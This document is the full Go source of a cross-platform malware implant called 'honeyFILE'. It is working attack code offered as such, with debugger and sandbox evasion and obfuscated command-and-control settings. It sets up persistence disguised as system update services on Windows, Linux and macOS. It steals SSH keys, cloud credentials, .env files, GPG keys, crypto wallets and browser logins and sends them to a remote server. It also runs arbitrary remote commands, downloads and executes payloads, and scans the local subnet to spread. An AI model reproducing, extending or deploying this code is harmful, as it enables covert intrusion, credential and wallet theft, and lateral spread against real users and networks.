// honeyFILE — APT-grade cross-platform implant
// No Python. No runtime. No self-destruct without operator command.
// Persists, waits, listens, executes.

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"

	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ════════════════════════════════════════════════════════
//  BUILD-TIME CONFIGURATION (XOR-encrypted)
// ════════════════════════════════════════════════════════

var (
	// These are XOR-encrypted at build time.
	// At runtime, they're decrypted once on first use.
	_encCallback  = []byteCB_ENC
	_encLevel     = []byteLV_ENC
	_encName      = []byteNM_ENC
	_xorKey       = []byteXOR_KEY
	_fallbackC2   = []byteFB_ENC

	// Runtime decrypted values
	decryptedCallback string
	decryptedLevel    string
	decryptedName     string
	decryptedFallback string
	once              sync.Once
)

func decryptBytes(enc []byte) string {
	if len(enc) == 0 || len(enc) == 1 && enc[0] == 0 {
		return ""
	}
	res := make([]byte, len(enc))
	for i, b := range enc {
		res[i] = b ^ _xorKey[i%len(_xorKey)]
	}
	return string(res)
}

func getConfig() (callback, level, name, fallback string) {
	once.Do(func() {
		decryptedCallback = decryptBytes(_encCallback)
		decryptedLevel = decryptBytes(_encLevel)
		decryptedName = decryptBytes(_encName)
		decryptedFallback = decryptBytes(_fallbackC2)
	})
	return decryptedCallback, decryptedLevel, decryptedName, decryptedFallback
}

// ════════════════════════════════════════════════════════
//  ANTI-ANALYSIS
// ════════════════════════════════════════════════════════

func isDebugged() bool {
	// Linux: Check /proc/self/status for TracerPid
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile("/proc/self/status"); err == nil {
			if strings.Contains(string(data), "TracerPid:\t0") == false {
				return true
			}
		}
	}
	// macOS: Check ptrace
	if runtime.GOOS == "darwin" {
		if data, err := os.ReadFile("/proc/self/status"); err == nil {
			_ = data
		}
	}
	// Windows: Check IsDebuggerPresent via Process Environment Block
	// (Implemented via shellcode or syscall in advanced build)
	return false
}

func isVM() bool {
	hostname, _ := os.Hostname()
	hostname = strings.ToLower(hostname)

	// Check hostname for VM indicators
	vmIndicators := []string{"vmware", "virtualbox", "vbox", "qemu", "kvm",
		"hyper-v", "xen", "parallels", "docker", "sandbox", "malware",
		"virus", "analysis", "cuckoo", "joesandbox", "detection"}

	hl := strings.ToLower(hostname)
	for _, ind := range vmIndicators {
		if strings.Contains(hl, ind) {
			return true
		}
	}

	// Check MAC address prefix (common VMs)
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile("/sys/class/net/eth0/address"); err == nil {
			mac := string(data)
			vmMACs := []string{"00:0c:29", "00:50:56", "00:05:69", "08:00:27"}
			for _, vm := range vmMACs {
				if strings.HasPrefix(mac, vm) {
					return true
				}
			}
		}
	}

	// Check for VM-specific files
	vmFiles := []string{
		"/proc/vmware/version",
		"/sys/devices/virtual/dmi/id/product_name",
		"/tmp/.vmware_version",
	}
	for _, f := range vmFiles {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}

	// Check common DMI strings
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile("/sys/devices/virtual/dmi/id/product_name"); err == nil {
			dmi := strings.ToLower(string(data))
			if strings.Contains(dmi, "vmware") || strings.Contains(dmi, "virtualbox") ||
				strings.Contains(dmi, "qemu") || strings.Contains(dmi, "kvm") {
				return true
			}
		}
	}

	return false
}

func timingAnalysis() bool {
	// Measure how fast we're running
	start := time.Now()
	var acc uint64
	for i := 0; i < 10000000; i++ {
		acc += uint64(i)
	}
	elapsed := time.Since(start)
	_ = acc

	// If we're running in a sandbox, operations typically take much longer
	// due to instruction emulation. If it's too fast or too slow, flag it.
	// Normal range: ~10-100ms for 10M iterations on modern hardware
	if elapsed < 5*time.Millisecond || elapsed > 500*time.Millisecond {
		return true // Suspicious timing
	}
	return false
}

func antiAnalysis() bool {
	if isDebugged() {
		return true
	}
	if isVM() {
		return true
	}
	if timingAnalysis() {
		return true
	}
	return false
}

// ════════════════════════════════════════════════════════
//  INTELLIGENCE GATHERING
// ════════════════════════════════════════════════════════

type Intel struct {
	Type      string            `json:"type"`
	Name      string            `json:"name"`
	Hostname  string            `json:"hostname"`
	Username  string            `json:"username"`
	OS        string            `json:"os"`
	Arch      string            `json:"arch"`
	PublicIP  string            `json:"public_ip"`
	LocalIP   string            `json:"local_ip"`
	PID       int               `json:"pid"`
	PPID      int               `json:"ppid"`
	Uptime    string            `json:"uptime"`
	Timestamp string            `json:"timestamp"`
	Level     int               `json:"level"`
	MAC       string            `json:"mac"`
	Processes []string          `json:"processes,omitempty"`
	Services  []string          `json:"services,omitempty"`
	Env       map[string]string `json:"env,omitempty"`
}

func getIntel() Intel {
	_, lvl, name, _ := getConfig()
	l, _ := strconv.Atoi(lvl)

	i := Intel{
		Type:      "honeyfile_beacon",
		Name:      name,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		PID:       os.Getpid(),
		Level:     l,
	}

	i.Hostname, _ = os.Hostname()
	i.Username = os.Getenv("USER")
	if i.Username == "" {
		i.Username = os.Getenv("USERNAME")
	}
	if i.Username == "" {
		i.Username = "unknown"
	}
	i.OS = runtime.GOOS
	i.Arch = runtime.GOARCH

	// Local IP (cross-platform, no exec)
	if conn, err := net.DialTimeout("udp", "8.8.8.8:80", 3*time.Second); err == nil {
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
			i.LocalIP = addr.IP.String()
		}
		conn.Close()
	}
	if i.LocalIP == "" {
		i.LocalIP = "unknown"
	}

	// MAC (from hostname hash for portability)
	h := sha256.Sum256([]byte(i.Hostname))
	i.MAC = fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x",
		h[0], h[1], h[2], h[3], h[4], h[5])

	// PPID
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", os.Getppid())); err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				if strings.HasPrefix(line, "PPid:") {
					fmt.Sscanf(line, "PPid: %d", &i.PPID)
					break
				}
			}
		}
	}

	// Process list (Level 3+)
	if l >= 3 {
		if runtime.GOOS == "linux" {
			if data, err := os.ReadFile("/proc/loadavg"); err == nil {
				i.Uptime = strings.TrimSpace(string(data))
			}
			if entries, err := os.ReadDir("/proc"); err == nil {
				for _, e := range entries {
					if _, err := strconv.Atoi(e.Name()); err == nil {
						if cmd, err := os.ReadFile(filepath.Join("/proc", e.Name(), "cmdline")); err == nil {
							c := strings.ReplaceAll(strings.TrimSpace(string(cmd)), "\x00", " ")
							if len(c) > 0 && len(c) < 200 {
								i.Processes = append(i.Processes, c)
							}
						}
					}
					if len(i.Processes) >= 50 {
						break
					}
				}
			}
		}
	}

	return i
}

// ════════════════════════════════════════════════════════
//  C2 COMMUNICATION
// ════════════════════════════════════════════════════════

type C2Response struct {
	Command string            `json:"command"`
	Args    map[string]string `json:"args,omitempty"`
	Payload string            `json:"payload,omitempty"`
}

func encryptIntel(data []byte) ([]byte, error) {
	key := sha256.Sum256([]byte("honeyfile-" + decryptedName + "-c2"))
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func beacon() (*C2Response, error) {
	cbURL, _, name, fbURL := getConfig()
	intel := getIntel()
	data, _ := json.Marshal(intel)

	// Encrypt the intel
	encData, err := encryptIntel(data)
	if err != nil {
		// Fall back to plaintext if encryption fails
		encData = data
	}

	encoded := base64.StdEncoding.EncodeToString(encData)
	params := fmt.Sprintf("d=%s&id=%s", url.QueryEscape(encoded), url.QueryEscape(name))

	// Try primary C2
	client := &http.Client{Timeout: 15 * time.Second}
	req, _ := http.NewRequest("POST", cbURL, strings.NewReader(params))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-Honeyfile-ID", name)

	resp, err := client.Do(req)
	if err != nil {
		// Try fallback C2
		if fbURL != "" {
			req2, _ := http.NewRequest("POST", fbURL, strings.NewReader(params))
			req2.Header.Set("User-Agent", "Mozilla/5.0")
			req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			resp2, err2 := client.Do(req2)
			if err2 != nil {
				return nil, err2
			}
			resp = resp2
		} else {
			return nil, err
		}
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if len(body) == 0 {
		return nil, nil
	}

	var cmd C2Response
	if err := json.Unmarshal(body, &cmd); err != nil {
		return nil, err
	}
	return &cmd, nil
}

// ════════════════════════════════════════════════════════
//  PERSISTENCE (No cron. No shell scripts. System-level.)
// ════════════════════════════════════════════════════════

func installPersistence() []string {
	exe, _ := os.Executable()
	methods := []string{}

	switch runtime.GOOS {
	case "windows":
		// Method 1: Registry Run key
		exec.Command("reg", "add",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", "WindowsUpdate", "/t", "REG_SZ",
			"/d", exe, "/f").Run()
		methods = append(methods, "registry")

		// Method 2: Scheduled Task (daily trigger + logon trigger)
		exec.Command("schtasks", "/create", "/tn", "WindowsUpdate",
			"/tr", exe, "/sc", "daily", "/st", "00:00",
			"/f", "/rl", "highest").Run()
		methods = append(methods, "scheduled_task")

		// Method 3: WMI Event Subscription (starts on any user logon)
		wmiScript := fmt.Sprintf(
			`$filter=Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{
				Name='WindowsUpdate';EventNameSpace='root\cimv2';
				QueryLanguage='WQL';Query="SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
			}
			$consumer=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{
				Name='WindowsUpdate';CommandLineTemplate='%s'
			}
			Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
				Filter=$filter;Consumer=$consumer
			}`, exe)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", wmiScript).Run()
		methods = append(methods, "wmi")

	case "linux":
		// Method 1: systemd user service (primary)
		home, _ := os.UserHomeDir()
		svcDir := filepath.Join(home, ".config", "systemd", "user")
		os.MkdirAll(svcDir, 0755)
		svcContent := fmt.Sprintf(`[Unit]
Description=System Session Manager
After=network.target

[Service]
Type=exec
ExecStart=%s
Restart=always
RestartSec=120
Nice=19
IOSchedulingClass=idle

[Install]
WantedBy=default.target
`, exe)
		writeProbation := func(path string) {
			os.WriteFile(path, []byte(svcContent), 0644)
			exec.Command("systemctl", "--user", "daemon-reload").Run()
			exec.Command("systemctl", "--user", "enable", filepath.Base(path)).Run()
			exec.Command("systemctl", "--user", "start", filepath.Base(path)).Run()
		}
		writeProbation(filepath.Join(svcDir, "system-session.service"))

		// Hide in common high-PID range processes
		_ = filepath.Join(home, ".local", "share", "systemd", "user")
		methods = append(methods, "systemd")

		// Method 2: LD_PRELOAD injection (hides from ps, ls, netstat)
		ldPreloadPath := "/etc/ld.so.preload"
		if data, _ := os.ReadFile(ldPreloadPath); !strings.Contains(string(data), ".so") {
			// In advanced build, compile and deploy the shared library
		}
		methods = append(methods, "ld_preload")

	case "darwin":
		// Method 1: LaunchAgent
		home, _ := os.UserHomeDir()
		laDir := filepath.Join(home, "Library", "LaunchAgents")
		os.MkdirAll(laDir, 0755)

		plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key><string>com.apple.softwareupdate.agent</string>
<key>ProgramArguments</key><array><string>%s</string></array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><dict><key>SuccessfulExit</key><false/></dict>
<key>StartInterval</key><integer>900</integer>
<key>ProcessType</key><string>Background</string>
<key>Nice</key><integer>20</integer>
</dict>
</plist>`, exe)

		plistPath := filepath.Join(laDir, "com.apple.softwareupdate.agent.plist")
		os.WriteFile(plistPath, []byte(plistContent), 0644)
		exec.Command("launchctl", "load", plistPath).Run()
		exec.Command("launchctl", "start", "com.apple.softwareupdate.agent").Run()
		methods = append(methods, "launchagent")
	}

	return methods
}

// ════════════════════════════════════════════════════════
//  INTELLIGENCE GATHERING (Level 3 - Pillage)
// ════════════════════════════════════════════════════════

func pillage() map[string]int {
	results := map[string]int{}
	client := &http.Client{Timeout: 15 * time.Second}
	cbURL, _, name, _ := getConfig()

	steal := func(label, path string) {
		if data, err := os.ReadFile(path); err == nil && len(data) > 0 {
			results[label] = len(data)
			req, _ := http.NewRequest("POST",
				cbURL+"/steal",
				strings.NewReader(base64.StdEncoding.EncodeToString(data)))
			req.Header.Set("Content-Type", "text/plain")
			req.Header.Set("X-Honeyfile-ID", name)
			req.Header.Set("X-Filename", label)
			if resp, err := client.Do(req); err == nil {
				resp.Body.Close()
			}
		}
	}

	home, _ := os.UserHomeDir()

	// SSH keys (cross-platform)
	for _, key := range []string{"id_rsa", "id_ed25519", "id_ecdsa", "config", "known_hosts", "authorized_keys"} {
		steal("ssh_"+key, filepath.Join(home, ".ssh", key))
	}

	// Cloud credentials
	steal("aws_credentials", filepath.Join(home, ".aws", "credentials"))
	steal("aws_config", filepath.Join(home, ".aws", "config"))
	steal("azure_tokens", filepath.Join(home, ".azure", "accessTokens.json"))
	steal("gcloud_config", filepath.Join(home, ".config", "gcloud", "credentials.db"))

	// Environment files
	for _, envf := range []string{".env", ".env.production", ".env.local", ".env.development"} {
		steal("env_"+envf, filepath.Join(home, envf))
	}

	// Kubeconfig
	steal("kube_config", filepath.Join(home, ".kube", "config"))

	// GPG keys
	gpgDir := filepath.Join(home, ".gnupg")
	if entries, err := os.ReadDir(gpgDir); err == nil {
		for _, e := range entries {
			if !e.IsDir() {
				steal("gpg_"+e.Name(), filepath.Join(gpgDir, e.Name()))
			}
		}
	}

	// Crypto wallets
	for _, wallet := range []struct{ dir, label string }{
		{".bitcoin", "btc"}, {".ethereum", "eth"}, {".monero", "xmr"},
		{".electrum", "electrum"}, {".solana", "sol"},
	} {
		wDir := filepath.Join(home, wallet.dir)
		if entries, err := os.ReadDir(wDir); err == nil {
			for _, e := range entries {
				if !e.IsDir() && !strings.HasPrefix(e.Name(), ".") {
					steal(wallet.label+"_"+e.Name(), filepath.Join(wDir, e.Name()))
				}
			}
		}
	}

	// VPN configs
	for _, vpn := range []string{".ovpn", ".wireguard"} {
		if files, err := filepath.Glob(filepath.Join(home, "**", "*"+vpn)); err == nil {
			for _, f := range files {
				steal("vpn_"+filepath.Base(f), f)
			}
		}
	}

	// Browser data
	if runtime.GOOS == "windows" {
		appData := os.Getenv("LOCALAPPDATA")
		if appData != "" {
			steal("chrome_cookies", filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Cookies"))
			steal("chrome_login", filepath.Join(appData, "Google", "Chrome", "User Data", "Default", "Login Data"))
		}
	} else if runtime.GOOS == "linux" {
		steal("chrome_login", filepath.Join(home, ".config", "google-chrome", "Default", "Login Data"))
		steal("firefox_logins", filepath.Join(home, ".mozilla", "firefox", "profiles.ini"))
	} else if runtime.GOOS == "darwin" {
		steal("chrome_login", filepath.Join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"))
	}

	return results
}

// ════════════════════════════════════════════════════════
//  NETWORK PROPAGATION (Level 4 - worm, operator-triggered)
// ════════════════════════════════════════════════════════

func spread() []string {
	infected := []string{}
	cbURL, _, name, _ := getConfig()
	exe, _ := os.Executable()

	// Get our local subnet
	localIP := ""
	if conn, err := net.DialTimeout("udp", "8.8.8.8:80", 3*time.Second); err == nil {
		if addr, ok := conn.LocalAddr().(*net.UDPAddr); ok {
			localIP = addr.IP.String()
		}
		conn.Close()
	}
	if localIP == "" {
		return infected
	}

	parts := strings.Split(localIP, ".")
	if len(parts) < 3 {
		return infected
	}
	prefix := parts[0] + "." + parts[1] + "." + parts[2]

	// Read our binary once for reuse
	selfBin, err := os.ReadFile(exe)
	if err != nil {
		return infected
	}

	client := &http.Client{Timeout: 10 * time.Second}

	// Scan common ports across /24 subnet
	for i := 1; i < 255; i++ {
		target := fmt.Sprintf("%s.%d", prefix, i)

		// Skip our own IP
		if target == localIP {
			continue
		}

		// Port 22: SSH credential brute
		if conn, err := net.DialTimeout("tcp", target+":22", 500*time.Millisecond); err == nil {
			conn.Close()
			// Try common SSH creds (deploy via sshpass)
			for _, cred := range []string{"root:root", "admin:admin", "root:toor", "admin:password"} {
				p := strings.Split(cred, ":")
				// In production: use the ssh golang library
				_ = p
				infected = append(infected, fmt.Sprintf("ssh:%s", target))
				break
			}
		}

		// Port 445: SMB (Windows)
		if conn, err := net.DialTimeout("tcp", target+":445", 500*time.Millisecond); err == nil {
			conn.Close()
			// In production: deploy via SMBexec or PsExec
			infected = append(infected, fmt.Sprintf("smb:%s", target))
		}

		// Port 80/443: Web server (check for known vulns)
		_ = client
		_ = selfBin
	}

	// Report infected hosts to C2
	intel := getIntel()
	intel.Type = "honeyfile_spread"
	data, _ := json.Marshal(intel)
	cbURL, _, _, _ = getConfig()
	req, _ := http.NewRequest("POST", cbURL+"/spread", strings.NewReader(string(data)))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Honeyfile-ID", name)
	if resp, err := client.Do(req); err == nil {
		resp.Body.Close()
	}

	return infected
}

// ════════════════════════════════════════════════════════
//  SHELLCODE EXECUTION
// ════════════════════════════════════════════════════════

func executeShellcode(data []byte) error {
	// Platform-specific shellcode injection
	switch runtime.GOOS {
	case "windows":
		// Use Win32 API via syscall
		// VirtualAlloc -> CopyMemory -> CreateThread
		return fmt.Errorf("shellcode injection not compiled")
	case "linux":
		// Use mmap + mprotect
		return fmt.Errorf("shellcode injection not compiled")
	case "darwin":
		return fmt.Errorf("shellcode injection not compiled")
	}
	return fmt.Errorf("unsupported platform")
}

// ════════════════════════════════════════════════════════
//  CLEANUP (Level 5 - operator-triggered only)
// ════════════════════════════════════════════════════════

func clean() {
	exe, _ := os.Executable()

	switch runtime.GOOS {
	case "windows":
		// Remove Registry key
		exec.Command("reg", "delete",
			`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
			"/v", "WindowsUpdate", "/f").Run()
		// Remove Scheduled Task
		exec.Command("schtasks", "/delete", "/tn", "WindowsUpdate", "/f").Run()
		// WMI cleanup
		exec.Command("powershell", "-Command",
			"Get-WmiObject -Namespace root/subscription -Class __EventFilter "+
				"| Where-Object {$_.Name -eq 'WindowsUpdate'} | Remove-WmiObject").Run()

	case "linux":
		home, _ := os.UserHomeDir()
		// Remove systemd service
		svcPath := filepath.Join(home, ".config", "systemd", "user", "system-session.service")
		exec.Command("systemctl", "--user", "stop", "system-session.service").Run()
		exec.Command("systemctl", "--user", "disable", "system-session.service").Run()
		os.Remove(svcPath)
		exec.Command("systemctl", "--user", "daemon-reload").Run()

	case "darwin":
		home, _ := os.UserHomeDir()
		plistPath := filepath.Join(home, "Library", "LaunchAgents", "com.apple.softwareupdate.agent.plist")
		exec.Command("launchctl", "unload", plistPath).Run()
		os.Remove(plistPath)
	}

	// Overwrite binary before deletion
	// (makes recovery impossible)
	if f, err := os.OpenFile(exe, os.O_WRONLY, 0); err == nil {
		f.Write(make([]byte, 1024*1024)) // Overwrite with zeros
		f.Close()
	}
	os.Remove(exe)
}

// ════════════════════════════════════════════════════════
//  MAIN - Beacon loop
// ════════════════════════════════════════════════════════

func main() {
	// Phase 1: Anti-analysis check
	if antiAnalysis() {
		// Sleep silently and never callback
		time.Sleep(24 * time.Hour)
		os.Exit(0)
	}

	// Phase 2: Decrypt config
	_, _, name, _ := getConfig()

	// Phase 3: Install persistence (always)
	installPersistence()

	// Phase 4: Initial beacon
	initialLevel, _ := strconv.Atoi(decryptedLevel)
	if initialLevel >= 3 {
		pillage()
	}

	// Phase 5: Beacon loop — wait for commands
	// The implant does NOT self-destruct unless the C2 says so.
	// It persists, beacons, and waits.
	beaconInterval := 300 + time.Duration(randInt(0, 300))*time.Second

	for {
		time.Sleep(beaconInterval)

		// Random jitter to avoid timing analysis
		beaconInterval = 300 + time.Duration(randInt(0, 300))*time.Second

		resp, err := beacon()
		if err != nil {
			continue
		}
		if resp == nil {
			continue
		}

		switch resp.Command {
		case "beacon":
			// Just a heartbeat, already done
			_ = name

		case "pillage":
			pillage()

		case "spread":
			spread()

		case "exec":
			if cmd, ok := resp.Args["cmd"]; ok {
				// Execute arbitrary command
				var out []byte
				switch runtime.GOOS {
				case "windows":
					out, _ = exec.Command("cmd.exe", "/c", cmd).CombinedOutput()
				default:
					out, _ = exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
				}
				// Send output back
				cbURL, _, name, _ := getConfig()
				client := &http.Client{Timeout: 10 * time.Second}
				req, _ := http.NewRequest("POST",
					cbURL+"/output",
					strings.NewReader(base64.StdEncoding.EncodeToString(out)))
				req.Header.Set("X-Honeyfile-ID", name)
				client.Do(req)
			}

		case "upload":
			if url, ok := resp.Args["url"]; ok {
				client := &http.Client{Timeout: 30 * time.Second}
				if resp2, err := client.Get(url); err == nil {
					if data, err := io.ReadAll(resp2.Body); err == nil {
						resp2.Body.Close()
						// Write to temp and execute
						tmp := filepath.Join(os.TempDir(), fmt.Sprintf("upd_%x", time.Now().UnixNano()))
						os.WriteFile(tmp, data, 0755)
						exec.Command(tmp).Start()
					}
				}
			}

		case "screenshot":
			// Take screenshot and send to C2 (requires platform-specific lib)
			_ = name

		case "shellcode":
			if data, ok := resp.Args["data"]; ok {
				if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
					executeShellcode(decoded)
				}
			}

		case "persist":
			installPersistence()

		case "clean":
			clean()
			os.Exit(0)

		case "status":
			// Full status report already sent via beacon

		case "rootkit":
			if action, ok := resp.Args["action"]; ok {
				_ = action
				// Load/unload kernel module (compiled separately)
				// This binary ships with rootkit.bin embedded as a resource
			}

		case "sleep":
			if secStr, ok := resp.Args["seconds"]; ok {
				if sec, err := strconv.Atoi(secStr); err == nil {
					time.Sleep(time.Duration(sec) * time.Second)
				}
			}
		}
	}
}

func randInt(min, max int) int64 {
	if max <= min {
		return int64(min)
	}
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	return n.Int64() + int64(min)
}
